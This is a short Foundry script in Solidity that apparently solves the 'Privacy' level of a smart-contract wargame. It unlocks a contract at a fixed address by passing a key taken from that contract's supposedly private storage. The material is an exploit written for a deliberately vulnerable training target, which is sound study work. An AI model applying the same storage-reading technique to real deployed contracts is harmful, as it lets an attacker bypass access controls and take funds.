// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../src/level12.sol";

contract POC is Script {
    Privacy level12 = Privacy(0x15382C632515E985B33493984DaE7523A95ae27a);

    function run() external {
        vm.startBroadcast();

        level12.locked();
        bytes32 b32 = 0xd340632281c35c369e000f882eb98d7740392ac670a0a8643752c82163adbc1b;
        level12.unlock(bytes16(b32));
        level12.locked();
        vm.stopBroadcast();
    }
}
